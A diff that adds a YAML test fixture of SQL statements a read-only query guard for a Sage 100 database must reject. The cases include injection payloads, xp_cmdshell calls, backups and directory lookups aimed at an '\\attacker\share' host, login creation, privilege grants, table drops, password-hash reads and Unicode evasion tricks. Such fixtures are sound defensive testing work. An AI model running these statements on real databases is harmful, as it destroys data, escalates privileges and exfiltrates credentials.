@@ -1,0 +1,466 @@
+# Statements sql/guard.py must reject (SPEC.md §9.1, §15.1). `code` is the expected error code.
+# tests/unit/test_guard.py also runs each case in case, comment, whitespace and semicolon variants.
+# Add a case here before relaxing anything in the guard.
+
+# --- Writes and DDL as the whole statement ---------------------------------------------------
+- code: WRITE_BLOCKED
+  sql: INSERT INTO AR_Customer (ARDivisionNo, CustomerNo) VALUES ('00', 'ZZZ')
+- code: WRITE_BLOCKED
+  sql: INSERT AR_Customer VALUES ('00', 'ZZZ')
+- code: WRITE_BLOCKED
+  sql: INSERT INTO AR_Customer SELECT * FROM AR_Customer
+- code: WRITE_BLOCKED
+  sql: INSERT INTO AR_Customer DEFAULT VALUES
+- code: WRITE_BLOCKED
+  sql: UPDATE AR_Customer SET CreditLimit = 0
+- code: WRITE_BLOCKED
+  sql: UPDATE c SET c.CreditLimit = 0 FROM AR_Customer c JOIN AR_OpenInvoice o ON o.CustomerNo = c.CustomerNo
+- code: WRITE_BLOCKED
+  sql: UPDATE TOP (10) AR_Customer SET CreditLimit = 0
+- code: WRITE_BLOCKED
+  sql: DELETE FROM AR_OpenInvoice
+- code: WRITE_BLOCKED
+  sql: DELETE AR_OpenInvoice WHERE Balance = 0
+- code: WRITE_BLOCKED
+  sql: DELETE o FROM AR_OpenInvoice o JOIN AR_Customer c ON c.CustomerNo = o.CustomerNo
+- code: WRITE_BLOCKED
+  sql: DELETE TOP (1) FROM AR_OpenInvoice
+- code: WRITE_BLOCKED
+  sql: MERGE INTO AR_Customer AS t USING AR_Customer AS s ON t.CustomerNo = s.CustomerNo WHEN MATCHED THEN DELETE;
+- code: WRITE_BLOCKED
+  sql: MERGE AR_Customer AS t USING (SELECT 1 AS a) AS s ON 1 = 1 WHEN NOT MATCHED THEN INSERT (CustomerNo) VALUES ('X');
+- code: WRITE_BLOCKED
+  sql: CREATE TABLE x (a INT)
+- code: WRITE_BLOCKED
+  sql: CREATE VIEW v AS SELECT * FROM AR_Customer
+- code: WRITE_BLOCKED
+  sql: CREATE PROCEDURE p AS SELECT 1
+- code: WRITE_BLOCKED
+  sql: CREATE FUNCTION f() RETURNS INT AS BEGIN RETURN 1 END
+- code: WRITE_BLOCKED
+  sql: CREATE INDEX ix ON AR_Customer (CustomerNo)
+- code: WRITE_BLOCKED
+  sql: CREATE LOGIN eve WITH PASSWORD = 'x'
+- code: WRITE_BLOCKED
+  sql: CREATE USER eve FOR LOGIN eve
+- code: WRITE_BLOCKED
+  sql: CREATE SCHEMA s
+- code: WRITE_BLOCKED
+  sql: CREATE TRIGGER t ON AR_Customer AFTER INSERT AS SELECT 1
+- code: WRITE_BLOCKED
+  sql: DROP TABLE AR_Customer
+- code: WRITE_BLOCKED
+  sql: DROP TABLE IF EXISTS AR_Customer
+- code: WRITE_BLOCKED
+  sql: DROP VIEW v
+- code: WRITE_BLOCKED
+  sql: DROP DATABASE MAS_EMP
+- code: WRITE_BLOCKED
+  sql: DROP LOGIN sage100_mcp
+- code: WRITE_BLOCKED
+  sql: ALTER TABLE AR_Customer ADD x INT
+- code: WRITE_BLOCKED
+  sql: ALTER TABLE AR_Customer DROP COLUMN CreditLimit
+- code: WRITE_BLOCKED
+  sql: ALTER LOGIN sage100_mcp WITH PASSWORD = 'x'
+- code: WRITE_BLOCKED
+  sql: ALTER DATABASE MAS_EMP SET SINGLE_USER
+- code: WRITE_BLOCKED
+  sql: ALTER ROLE db_owner ADD MEMBER sage100_mcp
+- code: WRITE_BLOCKED
+  sql: ALTER AUTHORIZATION ON DATABASE::MAS_EMP TO sa
+- code: WRITE_BLOCKED
+  sql: TRUNCATE TABLE AR_OpenInvoice
+- code: WRITE_BLOCKED
+  sql: GRANT SELECT ON AR_Customer TO public
+- code: WRITE_BLOCKED
+  sql: GRANT CONTROL SERVER TO sage100_mcp
+- code: WRITE_BLOCKED
+  sql: REVOKE SELECT ON AR_Customer FROM public
+- code: WRITE_BLOCKED
+  sql: DENY SELECT ON AR_Customer TO public
+- code: WRITE_BLOCKED
+  sql: ENABLE TRIGGER ALL ON AR_Customer
+- code: WRITE_BLOCKED
+  sql: DISABLE TRIGGER ALL ON AR_Customer
+
+# --- Procedures and dynamic SQL ----------------------------------------------------------------
+- code: WRITE_BLOCKED
+  sql: EXEC sp_who
+- code: WRITE_BLOCKED
+  sql: EXECUTE sp_who2
+- code: WRITE_BLOCKED
+  sql: EXEC('DELETE FROM AR_OpenInvoice')
+- code: WRITE_BLOCKED
+  sql: EXECUTE ('SELECT 1')
+- code: WRITE_BLOCKED
+  sql: EXEC sp_executesql N'DELETE FROM AR_OpenInvoice'
+- code: WRITE_BLOCKED
+  sql: EXEC master..xp_cmdshell 'dir c:\'
+- code: WRITE_BLOCKED
+  sql: EXEC xp_dirtree '\\attacker\share'
+- code: WRITE_BLOCKED
+  sql: EXEC sp_configure 'xp_cmdshell', 1
+- code: WRITE_BLOCKED
+  sql: EXEC @sql
+- code: WRITE_BLOCKED
+  sql: "{call sp_who}"
+- code: WRITE_BLOCKED
+  sql: "{ call sp_who }"
+- code: WRITE_BLOCKED
+  sql: "{?=call sp_who}"
+- code: WRITE_BLOCKED
+  sql: "{ ? = CALL dbo.p(1) }"
+- code: WRITE_BLOCKED
+  sql: "SELECT * FROM AR_Customer WHERE CustomerNo = {call sp_who}"
+- code: WRITE_BLOCKED
+  sql: CALL p()
+
+# --- Session, server and transaction control ---------------------------------------------------
+- code: WRITE_BLOCKED
+  sql: SET LOCK_TIMEOUT -1
+- code: WRITE_BLOCKED
+  sql: SET TRANSACTION ISOLATION LEVEL SERIALIZABLE
+- code: WRITE_BLOCKED
+  sql: SET ROWCOUNT 0
+- code: WRITE_BLOCKED
+  sql: SET IMPLICIT_TRANSACTIONS ON
+- code: WRITE_BLOCKED
+  sql: USE master
+- code: WRITE_BLOCKED
+  sql: USE MAS_SYSTEM
+- code: WRITE_BLOCKED
+  sql: DECLARE @x INT
+- code: WRITE_BLOCKED
+  sql: DECLARE @t TABLE (a INT)
+- code: WRITE_BLOCKED
+  sql: BEGIN TRANSACTION
+- code: WRITE_BLOCKED
+  sql: BEGIN TRAN
+- code: WRITE_BLOCKED
+  sql: COMMIT
+- code: WRITE_BLOCKED
+  sql: COMMIT TRANSACTION
+- code: WRITE_BLOCKED
+  sql: ROLLBACK
+- code: WRITE_BLOCKED
+  sql: SAVE TRANSACTION s1
+- code: WRITE_BLOCKED
+  sql: WAITFOR DELAY '00:00:10'
+- code: WRITE_BLOCKED
+  sql: WAITFOR TIME '23:59'
+- code: WRITE_BLOCKED
+  sql: SHUTDOWN
+- code: WRITE_BLOCKED
+  sql: SHUTDOWN WITH NOWAIT
+- code: WRITE_BLOCKED
+  sql: RECONFIGURE
+- code: WRITE_BLOCKED
+  sql: KILL 52
+- code: WRITE_BLOCKED
+  sql: CHECKPOINT
+- code: WRITE_BLOCKED
+  sql: DBCC CHECKDB
+- code: WRITE_BLOCKED
+  sql: DBCC DROPCLEANBUFFERS
+- code: WRITE_BLOCKED
+  sql: BACKUP DATABASE MAS_EMP TO DISK = '\\attacker\share\emp.bak'
+- code: WRITE_BLOCKED
+  sql: RESTORE DATABASE MAS_EMP FROM DISK = 'x'
+- code: WRITE_BLOCKED
+  sql: BULK INSERT AR_Customer FROM 'c:\x.csv'
+- code: WRITE_BLOCKED
+  sql: OPEN c
+- code: WRITE_BLOCKED
+  sql: FETCH NEXT FROM c
+- code: WRITE_BLOCKED
+  sql: DEALLOCATE c
+- code: WRITE_BLOCKED
+  sql: WRITETEXT AR_Customer.Comment @ptr 'x'
+
+# --- Writes hidden inside an otherwise read-shaped statement -----------------------------------
+- code: WRITE_BLOCKED
+  sql: SELECT * INTO x FROM AR_Customer
+- code: WRITE_BLOCKED
+  sql: "SELECT * INTO #x FROM AR_Customer"
+- code: WRITE_BLOCKED
+  sql: "SELECT * INTO ##x FROM AR_Customer"
+- code: WRITE_BLOCKED
+  sql: SELECT CustomerNo INTO MAS_EMP.dbo.x FROM AR_Customer WHERE 1 = 0
+- code: WRITE_BLOCKED
+  sql: SELECT a INTO x FROM (SELECT 1 AS a) AS s
+- code: WRITE_BLOCKED
+  sql: WITH c AS (SELECT * FROM AR_Customer) DELETE FROM c
+- code: WRITE_BLOCKED
+  sql: WITH c AS (SELECT * FROM AR_Customer) UPDATE c SET CreditLimit = 0
+- code: WRITE_BLOCKED
+  sql: WITH c AS (SELECT 1 AS a) INSERT INTO AR_Customer (CustomerNo) SELECT a FROM c
+- code: WRITE_BLOCKED
+  sql: WITH c AS (SELECT * FROM AR_Customer) SELECT * INTO x FROM c
+- code: WRITE_BLOCKED
+  sql: SELECT NEXT VALUE FOR dbo.seq
+- code: WRITE_BLOCKED
+  sql: SELECT CustomerNo, NEXT VALUE FOR seq AS n FROM AR_Customer
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer FOR UPDATE
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer FOR UPDATE OF CreditLimit
+
+# --- Table and query hints ---------------------------------------------------------------------
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer WITH (TABLOCKX)
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer WITH (UPDLOCK)
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer WITH (HOLDLOCK)
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer WITH (XLOCK, ROWLOCK)
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer WITH (NOLOCK)
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer WITH (READPAST)
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer c WITH (INDEX(0)) WHERE c.CustomerNo = 'A'
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer c JOIN AR_OpenInvoice o WITH (TABLOCK) ON o.CustomerNo = c.CustomerNo
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer OPTION (RECOMPILE)
+- code: WRITE_BLOCKED
+  sql: SELECT * FROM AR_Customer OPTION (MAXDOP 1)
+- code: WRITE_BLOCKED
+  sql: WITH r AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM r) SELECT n FROM r OPTION (MAXRECURSION 0)
+
+# --- Stacked statements ------------------------------------------------------------------------
+- code: MULTI_STATEMENT
+  sql: SELECT * FROM AR_Customer; DROP TABLE AR_Customer
+- code: MULTI_STATEMENT
+  sql: SELECT * FROM AR_Customer; DELETE FROM AR_OpenInvoice;
+- code: MULTI_STATEMENT
+  sql: SELECT 1 FROM AR_Customer; SELECT 2 FROM AR_Customer
+- code: MULTI_STATEMENT
+  sql: SELECT 1 FROM AR_Customer;; DELETE FROM AR_OpenInvoice
+- code: MULTI_STATEMENT
+  sql: |-
+    SELECT CustomerNo FROM AR_Customer
+    ;
+    UPDATE AR_Customer SET CreditLimit = 0
+- code: MULTI_STATEMENT
+  sql: SELECT 1 FROM AR_Customer /* comment */; EXEC xp_cmdshell 'dir'
+- code: MULTI_STATEMENT
+  sql: |-
+    SELECT 1 FROM AR_Customer -- comment
+    ; SHUTDOWN
+- code: MULTI_STATEMENT
+  sql: SELECT 1 FROM AR_Customer; WAITFOR DELAY '00:00:05'
+- code: MULTI_STATEMENT
+  sql: SELECT 1 FROM AR_Customer; SET LOCK_TIMEOUT 0
+- code: MULTI_STATEMENT
+  sql: SELECT 1 FROM AR_Customer; USE master; SELECT 1 FROM AR_Customer
+- code: MULTI_STATEMENT
+  sql: SELECT 1 FROM AR_Customer; BEGIN TRAN; DELETE FROM AR_OpenInvoice; COMMIT
+- code: MULTI_STATEMENT
+  sql: SELECT ';' FROM AR_Customer; DELETE FROM AR_OpenInvoice
+- code: MULTI_STATEMENT
+  sql: SELECT 'a;b' AS x FROM AR_Customer; INSERT INTO AR_Customer DEFAULT VALUES
+
+# --- Comment and spelling tricks ---------------------------------------------------------------
+- code: WRITE_BLOCKED
+  sql: /* SELECT */ DELETE FROM AR_OpenInvoice
+- code: WRITE_BLOCKED
+  sql: |-
+    -- SELECT * FROM AR_Customer
+    DELETE FROM AR_OpenInvoice
+- code: WRITE_BLOCKED
+  sql: /* /* nested */ SELECT */ DELETE FROM AR_OpenInvoice
+- code: WRITE_BLOCKED
+  sql: DeLeTe FrOm AR_OpenInvoice
+- code: WRITE_BLOCKED
+  sql: delete from AR_OpenInvoice
+- code: WRITE_BLOCKED
+  sql: "DELETE\tFROM\tAR_OpenInvoice"
+- code: WRITE_BLOCKED
+  sql: "DELETE/**/FROM/**/AR_OpenInvoice"
+- code: PARSE_ERROR
+  sql: "ＤＥＬＥＴＥ FROM AR_OpenInvoice"
+- code: PARSE_ERROR
+  sql: "DE\u200bLETE FROM AR_OpenInvoice"
+- code: PARSE_ERROR
+  sql: "SЕLECT * FROM AR_Customer"
+- code: PARSE_ERROR
+  sql: "\ufeffDELETE FROM AR_OpenInvoice"
+- code: MULTI_STATEMENT
+  sql: "SELECT 1 FROM AR_Customer;\u00a0DROP TABLE AR_Customer"
+- code: MULTI_STATEMENT
+  sql: SELECT 1 FROM AR_Customer /* ; */ ; DROP TABLE AR_Customer
+
+# --- Forbidden functions -----------------------------------------------------------------------
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT * FROM OPENROWSET('SQLNCLI', 'Server=x;Trusted_Connection=yes;', 'SELECT 1')
+- code: PARSE_ERROR
+  sql: SELECT * FROM OPENROWSET(BULK 'c:\windows\win.ini', SINGLE_CLOB) AS x
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT * FROM OPENQUERY(linked, 'SELECT 1')
+- code: TABLE_DENIED
+  sql: SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=x').db.dbo.t
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT * FROM OPENXML(@h, '/root', 2)
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT xp_cmdshell('whoami')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT xp_dirtree('\\attacker\share')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT xp_regread('HKEY_LOCAL_MACHINE', 'x', 'y')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT sp_helptext('AR_Customer')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT * FROM fn_dblog(NULL, NULL)
+- code: TABLE_DENIED
+  sql: SELECT * FROM sys.fn_get_audit_file('c:\audit\*', DEFAULT, DEFAULT)
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT * FROM fn_trace_gettable('c:\x.trc', DEFAULT)
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT dbo.fn_secret(CustomerNo) FROM AR_Customer
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT dbo.CustomFunction(1)
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT * FROM dbo.SomeTableFunction(1) AS f
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo IN (SELECT x FROM OPENQUERY(s, 'SELECT 1'))
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT c.CustomerNo FROM AR_Customer c JOIN OPENROWSET('MSOLEDBSQL', 'x', 'SELECT 1') AS r ON 1 = 1
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT SUSER_NAME()
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT OBJECT_ID('AR_Customer')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT DB_NAME()
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT HOST_NAME()
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT APP_NAME()
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT SERVERPROPERTY('MachineName')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT IS_SRVROLEMEMBER('sysadmin')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT * FROM read_csv('/etc/passwd')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT * FROM read_parquet('s3://bucket/x.parquet')
+- code: PARSE_ERROR
+  sql: SELECT * FROM glob('*')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT LOAD_FILE('/etc/passwd')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT pg_read_file('/etc/passwd')
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT @@VERSION
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT @@SERVERNAME
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT @@SPID
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = @customer
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT * FROM @t
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT CustomerNo FROM AR_Customer WHERE 1 = CONVERT(INT, @@VERSION)
+
+# --- Names outside the company's Sage tables ---------------------------------------------------
+- code: TABLE_DENIED
+  sql: SELECT * FROM MAS_EMP.dbo.AR_Customer
+- code: TABLE_DENIED
+  sql: SELECT * FROM MAS_PCC.dbo.AP_Vendor
+- code: TABLE_DENIED
+  sql: SELECT * FROM MAS_SYSTEM.dbo.SY_User
+- code: TABLE_DENIED
+  sql: SELECT * FROM MAS_EMP..AR_Customer
+- code: TABLE_DENIED
+  sql: SELECT * FROM linkedsrv.MAS_EMP.dbo.AR_Customer
+- code: TABLE_DENIED
+  sql: SELECT * FROM [MAS_EMP].[dbo].[AR_Customer]
+- code: TABLE_DENIED
+  sql: SELECT * FROM master.dbo.sysdatabases
+- code: TABLE_DENIED
+  sql: SELECT * FROM master..syslogins
+- code: TABLE_DENIED
+  sql: SELECT * FROM tempdb..x
+- code: TABLE_DENIED
+  sql: SELECT * FROM sys.objects
+- code: TABLE_DENIED
+  sql: SELECT * FROM sys.sql_logins
+- code: TABLE_DENIED
+  sql: SELECT * FROM sys.database_principals
+- code: TABLE_DENIED
+  sql: SELECT * FROM sys.dm_exec_sessions
+- code: TABLE_DENIED
+  sql: SELECT * FROM INFORMATION_SCHEMA.TABLES
+- code: TABLE_DENIED
+  sql: SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'AR_Customer'
+- code: TABLE_DENIED
+  sql: SELECT * FROM guest.AR_Customer
+- code: TABLE_DENIED
+  sql: "SELECT * FROM #tmp"
+- code: TABLE_DENIED
+  sql: "SELECT * FROM ##global"
+- code: TABLE_DENIED
+  sql: SELECT c.CustomerNo FROM AR_Customer c JOIN MAS_PCC.dbo.AP_Vendor v ON v.VendorNo = c.CustomerNo
+- code: TABLE_DENIED
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo IN (SELECT name FROM sys.databases)
+- code: TABLE_DENIED
+  sql: SELECT CustomerNo FROM AR_Customer UNION SELECT name FROM master..sysdatabases
+- code: TABLE_DENIED
+  sql: WITH x AS (SELECT name FROM sys.tables) SELECT * FROM x
+
+# --- Classic injection payloads inside a lookup -----------------------------------------------
+- code: MULTI_STATEMENT
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = ''; DROP TABLE AR_Customer; --'
+- code: MULTI_STATEMENT
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = '1'; EXEC xp_cmdshell 'dir'; --'
+- code: MULTI_STATEMENT
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = ''; WAITFOR DELAY '0:0:10'--'
+- code: MULTI_STATEMENT
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = ''; SHUTDOWN--'
+- code: MULTI_STATEMENT
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = ''; INSERT INTO AR_Customer DEFAULT VALUES--'
+- code: MULTI_STATEMENT
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = 1; UPDATE AR_Customer SET CreditLimit = 9999999
+- code: MULTI_STATEMENT
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = ''; CREATE LOGIN eve WITH PASSWORD = 'x'--'
+- code: MULTI_STATEMENT
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = ''; DECLARE @q NVARCHAR(100) SET @q = 'x' EXEC(@q)--'
+- code: TABLE_DENIED
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = '' UNION SELECT name FROM master..sysdatabases--'
+- code: TABLE_DENIED
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = '' UNION SELECT password_hash FROM sys.sql_logins--'
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = '' AND 1 = CONVERT(INT, @@VERSION)--'
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = '' AND 1 = (SELECT TOP 1 xp_cmdshell('dir'))--'
+- code: FORBIDDEN_FUNCTION
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = '' OR 1 = (SELECT COUNT(*) FROM OPENROWSET('SQLNCLI', 'x', 'SELECT 1'))--'
+- code: WRITE_BLOCKED
+  sql: SELECT CustomerNo FROM AR_Customer WHERE CustomerNo = '' UNION SELECT a FROM (SELECT 1 AS a) AS s FOR UPDATE
+
+# --- Not SQL at all, or nothing ----------------------------------------------------------------
+- code: PARSE_ERROR
+  sql: ""
+- code: PARSE_ERROR
+  sql: "   \n\t "
+- code: PARSE_ERROR
+  sql: ;
+- code: PARSE_ERROR
+  sql: /* only a comment */
+- code: PARSE_ERROR
+  sql: SELECT FROM WHERE
+- code: PARSE_ERROR
+  sql: SELECT * FROM AR_Customer WHERE (
+- code: PARSE_ERROR
+  sql: SELECT 'unterminated FROM AR_Customer
+- code: PARSE_ERROR
+  sql: SELECT * FROM AR_Customer WHERE CustomerNo = :customer
+
+# --- T-SQL that only the ANSI fallback reads, and that would be sent as T-SQL it can't read back (D58) ----
+- code: PARSE_ERROR
+  sql: SELECT TOP
+- code: PARSE_ERROR
+  sql: SELECT TOP FROM AR_Customer
